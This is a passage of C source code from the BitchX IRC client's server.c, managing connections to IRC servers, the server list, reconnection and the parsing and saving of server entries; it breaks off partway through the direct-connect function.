/*
 * server.c: Things dealing with server connections, etc. 
 *
 * Written By Michael Sandrof
 *
 * Copyright(c) 1990 
 *
 * See the COPYRIGHT file, or do a HELP IRCII COPYRIGHT 
 */
#ifdef IRIX
#define _HAVE_SIN_LEN 1
#define _HAVE_SA_LEN 1
#define MAXDNAME 100
#endif

#include "irc.h"
static char cvsrevision[] = "$Id: server.c 212 2012-09-20 02:36:48Z tcava $";
CVS_REVISION(server_c)
#include "struct.h"

#include "parse.h"

#include <stdarg.h>

#include "server.h"
#include "commands.h"
#include "ircaux.h"
#include "input.h"
#include "who.h"
#include "lastlog.h"
#include "exec.h"
#include "window.h"
#include "output.h"
#include "names.h"
#include "hook.h"
#include "vars.h"
#include "hash2.h"
#include "screen.h"
#include "notify.h"
#include "misc.h"
#include "status.h"
#include "list.h"
#include "who.h"
#define MAIN_SOURCE
#include "modval.h"

#ifdef WDIDENT
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#endif


#ifdef IRIX
#undef sa_len
#endif

static	char *	set_umode (int du_index);

const	char *  umodes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

/* server_list: the list of servers that the user can connect to,etc */
 	Server	*server_list = NULL;

/* number_of_servers: in the server list */
static	int	number_of_servers = 0;

	int	primary_server = -1;
	int	from_server = -1;
	int	never_connected = 1;		/* true until first connection
						 * is made */
	int	connected_to_server = 0;	/* true when connection is
						 * confirmed */
	int	parsing_server_index = -1;
	int	last_server = -1;

	extern	int
		dgets_errno;
	int	identd = -1;

#if defined(WINNT) || defined(__EMX__) || defined(__CYGWIN__) || defined(WANT_IDENTD)
	int	already_identd = 0;
#endif

/* link look and map commands */
irc_server *map = NULL;
static int first_time = 0;
extern char *channel;

int (*serv_open_func) (int, struct sockaddr_foobar, int) = NULL;
int (*serv_output_func) (int, int, char *, int) = NULL;
int (*serv_input_func)  (int, char *, int, int, int) = NULL;
int (*serv_close_func) (int, struct sockaddr_foobar, int) = NULL;

static QueueSend *serverqueue = NULL;

/*
 * close_server: Given an index into the server list, this closes the
 * connection to the corresponding server.  It does no checking on the
 * validity of the index.  It also first sends a "QUIT" to the server being
 * closed 
 */
void	BX_close_server (int cs_index, char *message)
{
	char buffer[IRCD_BUFFER_SIZE + 1];

	if (cs_index < 0 || cs_index > number_of_servers)
		return;

	if (serv_close_func)
		(*serv_close_func)(cs_index, server_list[cs_index].local_addr, server_list[cs_index].port);
	clean_server_queues(from_server);

	if (waiting_out > waiting_in)
		waiting_out = waiting_in = 0;

	if (get_server_reconnecting(cs_index))
		set_waiting_channel(cs_index);
	else
		clear_channel_list(cs_index);

	clear_link(&server_list[cs_index].server_last);
	clear_link(&server_list[cs_index].tmplink);
	clear_server_sping(cs_index, NULL);

	set_server_reconnect(cs_index, 0);
	set_server_reconnecting(cs_index, 0);
	set_server_try_once(cs_index, 0);
	server_list[cs_index].server_change_pending = 0;
	server_list[cs_index].operator = 0;
	server_list[cs_index].connected = 0;
	server_list[cs_index].buffer = NULL;
	server_list[cs_index].link_look = 0;
	server_list[cs_index].login_flags = 0;

	server_list[cs_index].awaytime = 0;
	new_free(&server_list[cs_index].away);
	new_free(&server_list[cs_index].recv_nick);
	new_free(&server_list[cs_index].sent_nick);
	new_free(&server_list[cs_index].sent_body);

	if (server_list[cs_index].write > -1)
	{
		if (message && *message && !server_list[cs_index].closing)
		{
			server_list[cs_index].closing = 1;
			if (x_debug & DEBUG_OUTBOUND)
				yell("Closing server %d because [%s]",
					   cs_index, message ? message : empty_string);
			snprintf(buffer, MAX_PROTOCOL_SIZE + 1, "QUIT :%s", message);
			strlcat(buffer, "\r\n", IRCD_BUFFER_SIZE + 1);
#ifdef HAVE_SSL
			if (get_server_ssl(cs_index))
			{
				BIO_write(server_list[cs_index].bio_fd, buffer, strlen(buffer));
				say("Closing SSL connection");
				SSL_shutdown(server_list[cs_index].ssl_fd);
			}
			else
#endif
				send(server_list[cs_index].write, buffer, strlen(buffer), 0);
		}
		new_close(server_list[cs_index].write);
	}
	if (server_list[cs_index].read > -1)
		new_close(server_list[cs_index].read);
	server_list[cs_index].write = server_list[cs_index].read = -1;
	if (identd != -1)
		set_socketflags(identd, 0);
#if defined(WINNT) || defined(__EMX__) || defined(CYGWIN) || defined(WANT_IDENTD)
	already_identd = 0;
#endif
}

int close_all_servers(char *message)
{
	int i;
	for (i = 0; i < number_of_servers; i++)
	{
		set_server_reconnecting(i, 0);
		close_server(i, message);
	}
	return 0;
}


/*
 * Check if the server that has a connection pending
 * has any windows that are going to switch over when
 * it connects.  If not abort the connection attempt.
 */
void close_unattached_server(int server)
{
#ifdef NON_BLOCKING_CONNECTS
	Window	*tmp = NULL;
	int	cnt = 0;

	if(server < 0 || server_list[server].old_server < 0)
		return;

	while ((traverse_all_windows(&tmp)))
	{
		if (tmp->server == -1)
				cnt++;
	}
	if (cnt == 0)
		close_server(server, empty_string);
#endif
}

void close_unattached_servers(void)
{
	int i;

	for (i = 0; i < number_of_servers; i++)
	{
		if(server_list[i].old_server == -2 ||
#ifdef NON_BLOCKING_CONNECTS
		   server_list[i].server_change_pending ||
#endif
		   server_list[i].reconnecting)
			close_server(i, empty_string);
	}
}

/*
 * set_server_bits: Sets the proper bits in the fd_set structure according to
 * which servers in the server list have currently active read descriptors.  
 */
long	set_server_bits (fd_set *rd, fd_set *wr)
{
	int	i;
	long timeout = 0;

	for (i = 0; i < number_of_servers; i++)
	{
		if (server_list[i].reconnect > 0)
		{
			/* CONNECT_DELAY is in seconds but we must
			 * return in milliseconds.
			 */
			timeout = get_int_var(CONNECT_DELAY_VAR)*1000;
			if(!timeout)
				timeout = -1;
		}

		if (server_list[i].read > -1)
			FD_SET(server_list[i].read, rd);
#ifdef NON_BLOCKING_CONNECTS
		if (!(server_list[i].login_flags & (LOGGED_IN|CLOSE_PENDING)) &&
		    server_list[i].write > -1)
			FD_SET(server_list[i].write, wr);
#endif
	}
	return timeout;
}


int timed_server (void *args, char *sub)
{
char *p = (char *)args;
static int retry = 0;
int serv = -1;
	if (!p || !*p)
		return 0;
	serv = atol(p);
	new_free(&p);
	if (!is_server_open(serv) && number_of_servers)
	{
		bitchsay("Servers exhausted. Restarting. [%d]", ++retry);
		get_connected(serv, from_server);
	}
	set_server_in_timed(serv, 0);
	return 0;
}

int find_old_server(int old_server)
{
	int i;

	if(old_server > -1 && old_server < number_of_servers)
	{
		for (i = 0; i < number_of_servers; i++)
		{
			if(server_list[i].old_server == old_server)
				return i;
		}
	}
	return -1;
}

int advance_server(int i)
{
	int server = i;

	/* We were waiting for this server to
	 * connect and it didn't, so we will either
	 * try again or move to the next server.
	 */

	server_list[i].retries++;
	if(server_list[i].retries >= get_int_var(MAX_SERVER_RECONNECT_VAR))
	{
		server = next_server(i);

		if(server != i)
		{
			/* We have a new server to try, so lets
			 * move the variables over from the last one
			 * and tell it to try to connect.
			 */
			set_server_reconnect(server, 1);
			set_server_req_server(server, server_list[i].req_server);
			set_server_old_server(server, server_list[i].old_server);
			set_server_change_refnum(server, server_list[i].server_change_refnum);
			set_server_retries(server, 0);
#ifdef NON_BLOCKING_CONNECTS
			server_list[server].from_server = server_list[i].from_server;
			server_list[server].c_server = server_list[i].c_server;
#endif
			/* Reset the old server to the default state. */
			server_list[i].retries = 0;
			server_list[i].reconnect = 0;
			server_list[i].old_server = -1;
			server_list[i].req_server = -1;
#ifdef NON_BLOCKING_CONNECTS
			server_list[i].connect_wait = 0;
			server_list[i].from_server = -1;
			server_list[i].c_server = -1;
#endif
		}
	}

	if(!get_int_var(AUTO_RECONNECT_VAR) && (server_list[server].req_server != server || server_list[server].retries > 1))
	{
		close_server(server, empty_string);
		clean_server_queues(server);
		from_server = -1;
		if(do_hook(DISCONNECT_LIST,"No Connection"))
			put_it("%s", convert_output_format(fget_string_var(FORMAT_DISCONNECT_FSET), "%s %s", update_clock(GET_TIME), "No connection"));
		return -1;
	}
	else if(server == server_list[i].req_server && server_list[server].retries > 1)
		bitchsay("Servers exhausted. Restarting.");

	return server;
}

void reconnect_server(int *servernum, int *times, time_t *last_timeout)
{
	int orig;

	if(*servernum < 0)
		*servernum = 0;

	orig = *servernum;

	server_list[*servernum].reconnecting = 1;
	close_server(*servernum, empty_string);
	*last_timeout = 0;

	(*servernum) = advance_server(*servernum);

	if(*servernum < 0)
		return;

	if(*servernum != orig)
		*times = 1;

	set_server_reconnect(*servernum, 0);
	window_check_servers(*servernum);
	try_connect(*servernum, server_list[*servernum].old_server);
}

/* Check for a nonblocking connection that has been around
 * for more than CONNECT_TIMEOUT_VAR seconds without connecting
 */
#ifdef NON_BLOCKING_CONNECTS
static void scan_nonblocking(void)
{
	int i;
	int connect_timeout = get_int_var(CONNECT_TIMEOUT_VAR);

	if (!connect_timeout)
		return;
	
	for (i = 0; i < number_of_servers; i++)
	{
		if (((server_list[i].read > -1) ||
		     (server_list[i].write > -1)) &&
		    !(server_list[i].login_flags & LOGGED_IN) &&
		    (time(NULL) - server_list[i].connect_time >
		     connect_timeout)) {
			if (server_list[i].read > -1)
				new_close(server_list[i].read);
			if (server_list[i].write > -1)
				new_close(server_list[i].write);
			server_list[i].read = server_list[i].write = -1;
			set_server_reconnect(i, 1);
		}
	}
}
#endif

void	do_idle_server (void)
{
	int i;
	static	int	times = 1;
	static	time_t	last_timeout = 0;

#ifdef NON_BLOCKING_CONNECTS
	scan_nonblocking();
#endif

	for (i = 0; i < number_of_servers && i > -1; i++)
	{
		/* We were told to reconnect, to avoid recursion. */
		if(get_server_reconnect(i) > 0)
		{
			int connect_delay = get_int_var(CONNECT_DELAY_VAR);

			if(!connect_delay || (time(NULL) - server_list[i].connect_time) > connect_delay)
			{
				int servernum = i;

				set_server_reconnect(i, 0);
				reconnect_server(&servernum, &times, &last_timeout);
			}
		}
	}
}

/*
 *
 do_server: check the given fd_set against the currently open servers in
 * the server list.  If one have information available to be read, it is read
 * and and parsed appropriately.  If an EOF is detected from an open server,
 * one of two things occurs. 1) If the server was the primary server,
 * get_connected() is called to maintain the connection status of the user.
 * 2) If the server wasn't a primary server, connect_to_server() is called to
 * try to keep that connection alive. 
 */
void	do_server (fd_set *rd, fd_set *wr)
{
	char	buffer[BIG_BUFFER_SIZE + 1];
	int	des,
		i;
	static	int	times = 1;
static	time_t	last_timeout = 0;

#ifdef NON_BLOCKING_CONNECTS
	scan_nonblocking();
#endif

	for (i = 0; i < number_of_servers; i++)
	{
		/* We were told to reconnect, to avoid recursion. */
		if(get_server_reconnect(i) > 0)
		{
			int connect_delay = get_int_var(CONNECT_DELAY_VAR);

			if(!connect_delay || (time(NULL) - server_list[i].connect_time) > connect_delay)
			{
				int servernum = i;

				set_server_reconnect(i, 0);
				reconnect_server(&servernum, &times, &last_timeout);
			}
		}

#ifdef NON_BLOCKING_CONNECTS
		if (((des = server_list[i].write) > -1) && FD_ISSET(des, wr) && !(server_list[i].login_flags & LOGGED_IN))
		{
			struct sockaddr_in sa;
			int salen = sizeof(struct sockaddr_in);

			if (getpeername(des, (struct sockaddr *) &sa, &salen) != -1)
			{
#ifdef HAVE_SSL
				if(!server_list[i].ctx || server_list[i].ssl_error == SSL_ERROR_WANT_WRITE)
				{
#endif
					server_list[i].connect_wait = 0;
					finalize_server_connect(i, server_list[i].c_server, i);
#ifdef HAVE_SSL
				}
#endif
			}
		}
#endif
		if (((des = server_list[i].read) > -1) && FD_ISSET(des, rd))
		{
			int	junk = 0;
			char 	*bufptr;
			errno	= 0;
			last_server = from_server = i;
			bufptr = buffer;
			if (serv_input_func)
				junk = (*serv_input_func)(i, bufptr, des, 1, BIG_BUFFER_SIZE);
			else
			{
#ifdef HAVE_SSL
				if(get_server_ssl(i))
				{
#ifdef NON_BLOCKING_CONNECTS
					/* If we get here before getting above we have problems. */
					if(!(server_list[i].login_flags & LOGGED_IN))
					{
						if(!server_list[i].ctx || server_list[i].ssl_error == SSL_ERROR_WANT_READ)
						{
							server_list[i].connect_wait = 0;
							finalize_server_connect(i, server_list[i].c_server, i);
						}
					}
					else
#endif
						junk = dgets(bufptr, des, 1, BIG_BUFFER_SIZE, server_list[i].bio_fd);
				}
				else
#endif
					junk = dgets(bufptr, des, 1, BIG_BUFFER_SIZE, NULL);
			}
			switch (junk)
			{
				case 0: /* timeout */
					break;
				case -1: /* EOF condition */
					{
						int try_once = server_list[i].try_once;

						/* Try to make sure output goes to the correct window */
						if(server_list[i].server_change_refnum > -1)
							set_display_target_by_winref(server_list[i].server_change_refnum);
						say("Connection closed from %s: %s", server_list[i].name, dgets_strerror(dgets_errno));

						server_list[i].reconnecting = 1;
						close_server(i, empty_string);
						if(!try_once)
						{
#ifdef NON_BLOCKING_CONNECTS
							if(server_list[i].server_change_pending == 2)
							{
								/* If the previous server gets closed while
								 * we are waiting for another server to connect
								 * we don't want to try a new connection, so
								 * just close down this connection and quit.
								 */
								close_server(i, empty_string);
							}
							else if(server_list[i].connect_wait)
							{
								set_server_reconnect(i, 1);

								if ((server_list[i].from_server != -1))
								{
									if((server_list[server_list[i].from_server].read != -1) &&
									   (server_list[i].from_server != i))
									{
										/* Set the windows back to the old server */
										say("Connection to server %s resumed...", server_list[server_list[i].from_server].name);
										change_server_channels(i, server_list[i].old_server);
										set_window_server(-1, i, 1);
										set_server_reconnect(i, 0);
									} else if(server_list[i].from_server != i)
									{
										close_server(server_list[i].from_server, empty_string);
									}
								}

							}
							else
#endif
							{
								set_server_reconnect(i, 1);
								server_list[i].old_server = i;
							}
						}
						break;
					}
				default:
				{
					last_timeout = 0;
					parsing_server_index = i;
					server_list[i].last_msg = now;
					parse_server(buffer);
					new_free(&server_list[i].buffer);
					parsing_server_index = -1;
					reset_display_target();
					break;
				}
			}
			from_server = primary_server;
		}
		if (server_list[i].read != -1 && (errno == ENETUNREACH || errno == EHOSTUNREACH))
		{
			if (last_timeout == 0)
				last_timeout = now;
			else if (now - last_timeout > 600)
			{
				close_server(i, empty_string);
				server_list[i].reconnecting = 1;
				get_connected(i, -1);
			}
		}
	}

	if (primary_server == -1 || !is_server_open(primary_server))
		window_check_servers(-1);
}

/*
 * find_in_server_list: given a server name, this tries to match it against
 * names in the server list, returning the index into the list if found, or
 * -1 if not found 
 */
extern	int	BX_find_in_server_list (char *server, int port)
{
	int	i,
		len, hintfound = -1;
	
	len = strlen(server);

	for (i = 0; i < number_of_servers; i++)
	{
		if (port && server_list[i].port && port != server_list[i].port && port != -1)
			continue;

#if 0
#define MATCH_WITH_COMPLETION(n1, n2) 			\
{							\
	size_t l1 = strlen(n1);				\
	size_t l2 = strlen(n2);				\
	size_t l3 = l1 > l2 ? l2 : l1;			\
							\
	if (!my_strnicmp(n1, n2, l3))			\
		return i;				\
}


		MATCH_WITH_COMPLETION(server, server_list[i].name);
		
		if (!server_list[i].itsname)
			continue;
		MATCH_WITH_COMPLETION(server, server_list[i].itsname);
#endif
		/*
		 * Try to avoid unneccessary string compares. Only compare
		 * the first part of the string if there's not already a
		 * possible match set in "hintfound". This enables us to
		 * search for an exact match even if there's already a
		 * fuzzy-match, without having to compare twice.
		 */
		if ((-1 != hintfound) || !my_strnicmp(server, server_list[i].name, len))
		{
			if (!my_stricmp(server, server_list[i].name))
				return i;
			else if (-1 == hintfound)
				hintfound = i;
		}
		else if (server_list[i].itsname && ((-1 != hintfound) ||
			!my_strnicmp(server, server_list[i].itsname, len)))
		{
			if (!my_stricmp(server, server_list[i].itsname))
				return i;
			else if (-1 == hintfound)
				hintfound = i;
		}
	}
	return (hintfound);
}

/*
 * parse_server_index:  given a string, this checks if it's a number, and if
 * so checks it validity as a server index.  Otherwise -1 is returned 
 */
int	BX_parse_server_index (char *str)
{
	int	i;

	if (is_number(str))
	{
		i = my_atol(str);
		if ((i >= 0) && (i < number_of_servers))
			return (i);
	}
	return (-1);
}

/*
 * This replaces ``get_server_index''.
 */
int 	BX_find_server_refnum (char *server, char **rest)
{
	int 	refnum;
	int	port = irc_port;
	char 	*cport = NULL, 
		*password = NULL,
		*nick = NULL,
		*snetwork = NULL,
		*sasl_nick = NULL,
		*sasl_pass = NULL;

	/*
	 * First of all, check for an existing server refnum
	 */
	if ((refnum = parse_server_index(server)) != -1)
		return refnum;
	/*
	 * Next check to see if its a "server:port:password:nick:network:saslnick:saslpass"
	 */
	else if (index(server, ':') || index(server, ','))
		parse_server_info(server, &cport, &password, &nick, &snetwork, &sasl_nick, &sasl_pass);

	else if (index(server, '['))
	{
		int i;
		server++; 
		chop(server, 1);
		if (!server || !*server)
			return from_server;
		for (i = 0; i < number_of_servers; i++)
		{
			if (server && server_list[i].snetwork && !my_stricmp(server, server_list[i].snetwork))
				return i;
		}
	}
	/*
	 * Next check to see if its "server port password nick network saslnick saslport"
	 */
	else if (rest && *rest)
	{
		cport = next_arg(*rest, rest);
		password = next_arg(*rest, rest);
		nick = next_arg(*rest, rest);
		snetwork = next_arg(*rest, rest);
		sasl_nick = next_arg(*rest, rest);
		sasl_pass = next_arg(*rest, rest);
	}

	if (cport && *cport)
		port = my_atol(cport);

	/*
	 * Add to the server list (this will update the port
	 * and password fields).
	 */
	add_to_server_list(server, port, password, nick, snetwork, sasl_nick, sasl_pass, 0, 1);
	return from_server;
}


/*
 * add_to_server_list: adds the given server to the server_list.  If the
 * server is already in the server list it is not re-added... however, if the
 * overwrite flag is true, the port and passwords are updated to the values
 * passes.  If the server is not on the list, it is added to the end. In
 * either case, the server is made the current server. 
 */
void 	BX_add_to_server_list (char *server, int port, char *password, char *nick, char *snetwork, char *sasl_nick, char *sasl_pass, int ssl, int overwrite)
{
extern int default_swatch;
	if ((from_server = find_in_server_list(server, port)) == -1)
	{
		from_server = number_of_servers++;
		RESIZE(server_list, Server, number_of_servers+1);
		memset(&server_list[from_server], 0, sizeof(Server));		
		server_list[from_server].name = m_strdup(server);
		if (snetwork)
			server_list[from_server].snetwork = m_strdup(snetwork);
		server_list[from_server].read = -1;
		server_list[from_server].write = -1;
		server_list[from_server].lag = -1;
		server_list[from_server].motd = 1;
		server_list[from_server].ircop_flags = default_swatch;
		server_list[from_server].port = port;
#ifdef HAVE_SSL
		set_server_ssl(from_server, ssl);
#endif
		malloc_strcpy(&server_list[from_server].umodes, umodes);
		if (password && *password)
			malloc_strcpy(&(server_list[from_server].password), password);

		if (nick && *nick)
			malloc_strcpy(&(server_list[from_server].d_nickname), nick);
		else if (!server_list[from_server].d_nickname)
			malloc_strcpy(&(server_list[from_server].d_nickname), nickname);

		if (sasl_nick && *sasl_nick)
			malloc_strcpy(&(server_list[from_server].sasl_nick), sasl_nick);
		if (sasl_pass && *sasl_pass)
			malloc_strcpy(&(server_list[from_server].sasl_pass), sasl_pass);

		make_notify_list(from_server);
		make_watch_list(from_server);
		set_umode(from_server);
	}
	else
	{
		if (overwrite)
		{
			server_list[from_server].port = port;
			if (password || !server_list[from_server].password)
			{
				if (password && *password)
					malloc_strcpy(&(server_list[from_server].password), password);
				else
					new_free(&(server_list[from_server].password));
			}
			if (nick || !server_list[from_server].d_nickname)
			{
				if (nick && *nick)
					malloc_strcpy(&(server_list[from_server].d_nickname), nick);
				else
					new_free(&(server_list[from_server].d_nickname));
			}
			if (sasl_nick || !server_list[from_server].sasl_nick)
			{
				if (sasl_nick && *sasl_nick)
					malloc_strcpy(&(server_list[from_server].sasl_nick), sasl_nick);
				else
					new_free(&(server_list[from_server].sasl_nick));
			}
			if (sasl_pass || !server_list[from_server].sasl_pass)
			{
				if (sasl_pass && *sasl_pass)
					malloc_strcpy(&(server_list[from_server].sasl_pass), sasl_pass);
				else
					new_free(&(server_list[from_server].sasl_pass));
			}
		}
		if (strlen(server) > strlen(server_list[from_server].name))
			malloc_strcpy(&(server_list[from_server].name), server);
	}
}

void 	remove_from_server_list (int i)
{
	Window	*tmp = NULL;

	if (i < 0 || i >= number_of_servers)
		return;

	say("Deleting server [%d]", i);

	clean_server_queues(i);

	new_free(&server_list[i].name);
	new_free(&server_list[i].snetwork);
	new_free(&server_list[i].itsname);
	new_free(&server_list[i].password);
	new_free(&server_list[i].away);
	new_free(&server_list[i].version_string);
	new_free(&server_list[i].nickname);
	new_free(&server_list[i].s_nickname);
	new_free(&server_list[i].d_nickname);
	new_free(&server_list[i].umodes);
	new_free(&server_list[i].recv_nick);
	new_free(&server_list[i].sent_nick);
	new_free(&server_list[i].sent_body);
#ifdef HAVE_SSL
	SSL_CTX_free(server_list[i].ctx);
#endif
	clear_server_sping(i, NULL);
		
	/* 
	 * this should save a coredump.  If number_of_servers drops
	 * down to zero, then trying to do a realloc ends up being
	 * a free, and accessing that is a no-no.
	 */
	if (number_of_servers == 1)
	{
		say("Sorry, the server list is empty and I just don't know what to do.");
		irc_exit(1, NULL, NULL);
	}

	memmove(&server_list[i], &server_list[i + 1], (number_of_servers - i - 1) * sizeof(Server));
	number_of_servers--;
	RESIZE(server_list, Server, number_of_servers);

	/* update all he structs with server in them */
	channel_server_delete(i);
	exec_server_delete(i);
        if (i < primary_server)
                --primary_server;
        if (i < from_server)
                --from_server;
	while ((traverse_all_windows(&tmp)))
		if (tmp->server > i)
			tmp->server--;
}



/*
 * parse_server_inFo:  This parses a single string of the form
 * "server:portnum:password:nickname:snetwork".  It the points port to the portnum
 * portion and password to the password portion.  This chews up the original
 * string, so * upon return, name will only point the the name.  If portnum
 * or password are missing or empty,  their respective returned value will
 * point to null. 
 *
 * With IPv6 patch it also supports comma as a delimiter.
 */
void	BX_parse_server_info (char *name, char **port, char **password, char **nick, char **snetwork, char **sasl_nick, char **sasl_pass)
{
	char *ptr, delim;

	delim = (index(name, ',')) ? ',' : ':';

	*port = *password = *nick = *sasl_nick = *sasl_pass = NULL;
	if ((ptr = (char *) strchr(name, delim)) != NULL)
	{
		*(ptr++) = (char) 0;
		if (strlen(ptr) == 0)
			*port = NULL;
		else
		{
			*port = ptr;
			if ((ptr = (char *) strchr(ptr, delim)) != NULL)
			{
				*(ptr++) = (char) 0;
				if (strlen(ptr) == 0)
					*password = 0;
				else
				{
					*password = ptr;
					if ((ptr = (char *) strchr(ptr, delim))
							!= NULL)
					{
						*(ptr++) = 0;
						if (!strlen(ptr))
							*nick = NULL;
						else
						{
							*nick = ptr;
							if ((ptr = strchr(ptr, delim)) !=NULL)
							{
								*(ptr++) = 0;
								if  (!strlen(ptr))
									*snetwork = NULL;
								else
								{
									*snetwork = ptr;
									if ((ptr = strchr(ptr, delim)) != NULL)
									{
										*(ptr++) = 0;
										if (!strlen(ptr))
											*sasl_nick = NULL;
										else
										{
											*sasl_nick = ptr;
											if ((ptr = strchr(ptr, delim)) != NULL)
											{
												*(ptr++) = 0;
												if (!strlen(ptr))
													*sasl_pass = NULL;
												else
													*sasl_pass = ptr;
											}
											
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

/*
 * build_server_list: given a whitespace separated list of server names this
 * builds a list of those servers using add_to_server_list().  Since
 * add_to_server_list() is used to added each server specification, this can
 * be called many many times to add more servers to the server list.  Each
 * element in the server list case have one of the following forms: 
 *
 * servername 
 * servername:port 
 * servername:port:password 
 * servername::password 
 * [servernetwork]
 * servername:port:password:nick:servernetwork:saslnick:saslpass
 * Note also that this routine mucks around with the server string passed to it,
 * so make sure this is ok 
 */
static char *default_network = NULL;

int	BX_build_server_list (char *servers)
{
	char	*host,
		*rest,
		*password = NULL,
		*port = NULL,
		*nick = NULL,
		*snetwork = NULL,
		*sasl_nick = NULL,
		*sasl_pass = NULL;

	int	port_num;
	int	i = 0;
#ifdef HAVE_SSL
	extern int do_use_ssl;
#else
	int do_use_ssl = 0;
#endif

	if (!servers || !*servers)
		return 0;

	while (servers)
	{
		if ((rest = (char *) strchr(servers, '\n')) != NULL)
			*rest++ = 0;
		while ((host = new_next_arg(servers, &servers)) != NULL)
		{
			if (!host || !*host)
				break;
			if (*host == '[')
			{
				host++;
				if (host[strlen(host)-1] != ']' && servers && *servers)
				{
					char *ptr = NULL;
					host[strlen(host)] = ' ';
					if ((ptr = MatchingBracket(host, '[', ']')))
					{
						*ptr++ = 0; 
						servers = ptr;
					}
				}
				if (host[strlen(host)-1] == ']')
					chop(host, 1);
				malloc_strcpy(&default_network, host);
				snetwork = NULL;
				continue;
			}
			parse_server_info(host, &port, &password, &nick, &snetwork, &sasl_nick, &sasl_pass);
			if (port && *port)
			{
				if (!(port_num = my_atol(port)))
					port_num = irc_port;
			}
			else
				port_num = irc_port;

			add_to_server_list(host, port_num, password, nick, snetwork ? snetwork : default_network, sasl_nick, sasl_pass, do_use_ssl, 0);
			i++;
		}
		servers = rest;
	}
	return i;
}

int read_and_parse_server(char **filename, char *buffer)
{
FILE *fp;
int i = 0;
	if ((fp = uzfopen(filename, ".", 0)))
	{
		char *p;
		while (fgets(buffer, BIG_BUFFER_SIZE, fp))
		{
			chop(buffer, 1);
			if ((p = strchr(buffer, '#')))
				*p = 0;
			i += build_server_list(buffer);
		}
		fclose(fp);
	} 
	return i;
}

/*
 * read_server_file: reads hostname:portnum:password:network server information from
 * a file and adds this stuff to the server list.  See build_server_list()/ 
 */
int BX_read_server_file (char *servers_file)
{
	int some = 0;
	char *file_path = NULL;
	char	buffer[BIG_BUFFER_SIZE + 1];
	int old_window_display = window_display;
	char    *expanded;

	window_display = 0;

	if (getenv("IRC_SERVERS_FILE"))
	{
		malloc_strcpy(&file_path, getenv("IRC_SERVERS_FILE"));
		expanded = expand_twiddle(file_path);
		some = read_and_parse_server(&expanded, buffer);
		new_free(&file_path);
		new_free(&expanded);
	}

#ifdef SERVERS_FILE
	if (SERVERS_FILE[0] != '/')
		file_path = m_opendup(irc_lib, "/", NULL);
	malloc_strcat(&file_path, SERVERS_FILE);
	some += read_and_parse_server(&file_path, buffer);
	new_free(&file_path);
#endif	

	if (*servers_file == '/')
		file_path = m_strdup(servers_file);
	else
		file_path = m_opendup("~/", servers_file, NULL);
	some += read_and_parse_server(&file_path, buffer);
	new_free(&file_path);

	window_display = old_window_display;
	return some;
}


/*
 * Actually do the work of writing out all the entries.
 */
void write_server_list(char *filename)
{
	FILE *serverfile;
	char *sgroup = NULL;
	int i;

	if(!number_of_servers || !(serverfile = fopen(filename, "w")))
		return;

	bitchsay("Writing server list to %s", filename);

	fprintf(serverfile, "# Server list generated by BitchX.\n");

	for(i=0;i<number_of_servers;i++)
	{
		if(!sgroup && server_list[i].snetwork)
		{
			sgroup = server_list[i].snetwork;
			fprintf(serverfile, "\n[%s]\n", sgroup);
		}
		else if(sgroup && server_list[i].snetwork &&
				my_stricmp(sgroup, server_list[i].snetwork))
		{
			sgroup = server_list[i].snetwork;
			fprintf(serverfile, "\n[%s]\n", sgroup);
		}
		else if(sgroup && !server_list[i].snetwork)
		{
			sgroup = NULL;
			fprintf(serverfile, "\n[unknown]\n");
		}

		fprintf(serverfile, "%s:%d", server_list[i].name, server_list[i].port);
		if(server_list[i].password)
			fprintf(serverfile, ":%s", server_list[i].password);
		fprintf(serverfile, "\n");
	}

	fclose(serverfile);
}

/*
 * write_server_file: writes hostname:portnum:password:network server information
 * to a file.
 */
void write_server_file (char *servers_file)
{
	char *file_path = NULL;
	char    *expanded;

	if(servers_file && *servers_file)
	{
		if (*servers_file == '/')
			file_path = m_strdup(servers_file);
		else
			file_path = m_opendup("~/", servers_file, NULL);
		write_server_list(file_path);
		new_free(&file_path);
		return;
	}

	if (getenv("IRC_SERVERS_FILE"))
	{
		malloc_strcpy(&file_path, getenv("IRC_SERVERS_FILE"));
		expanded = expand_twiddle(file_path);
		write_server_list(expanded);
		new_free(&file_path);
		new_free(&expanded);
		return;
	}

#if defined(WINNT) || defined(__EMX__)
	malloc_strcpy(&file_path, "~/irc-serv");
#else
	malloc_strcpy(&file_path, "~/.ircservers");
#endif
	expanded = expand_twiddle(file_path);
	write_server_list(expanded);
	new_free(&file_path);
	new_free(&expanded);
}


/*
 * connect_to_server_direct: handles the tcp connection to a server.  If
 * successful, the user is disconnected from any previously connected server,
 * the new server is added to the server list, and the user is registered on
 * the new server.  If connection to the server is not successful,  the
 * reason for failure is displayed and the previous server connection is
 * resumed uniterrupted. 
 *
 * This version of connect_to_server() connects directly to a server 
 */
static	int	connect_to_server_direct (char *server_name, int port)
{
	int		new_des;
	struct sockaddr_foobar	*localaddr;
	int		address_len;
	unsigned short	this_sucks;


#ifdef WDIDENT
	struct stat sb;
	struct passwd *pw;
	char lockfile[1024];
	FILE *fp;
	char candofilestuff=0;	
	struct hostent *hp=NULL;
	struct sockaddr_in raddr;
#endif


	oper_command = 0;
	errno = 0;
	localaddr = &server_list[from_server].local_sockname;
	memset(localaddr, 0, sizeof(*localaddr));
	this_sucks = (unsigned short)port;


#ifdef WDIDENT
	pw=getpwuid(getuid());
	if(!pw)
		goto noidentwd;
	sprintf(lockfile, "%s/.identwd", pw->pw_dir);
	
	if(*server_name=='/')
		goto noidentwd;
	
	if(stat(lockfile, &sb))
		goto noidentwd;
	
	if(!(sb.st_mode & S_IFDIR))
		goto noidentwd;
	
	hp=resolv(server_name);
	if(!hp)
		goto noidentwd;
	if(hp->h_addrtype != AF_INET)
		goto noidentwd;
	
	memcpy(&raddr.sin_addr, hp->h_addr, hp->h_length);
	sprintf(lockfile, "%s/.identwd/%s.%i.LOCK", pw->pw_dir,
		inet_ntoa((struct in_addr)raddr.sin_addr), port);
	if ((fp=fopen(lockfile, "w")))
	{
		fprintf(fp, "WAIT\n");
		fclose(fp);
		candofilestuff=1;
	}
noidentwd:
#endif

#ifdef NON_BLOCKING_CONNECTS
	new_des = connect_by_number(server_name, &this_sucks, SERVICE_CLIENT, PROTOCOL_TCP, 1);
#else
	new_des = connect_by_number(server_name, &this_sucks, SERVICE_CLIENT, PROTOCOL_TCP, 0);
#endif

	port = this_sucks;

	if (new_des < 0)
	{
		if (x_debug)
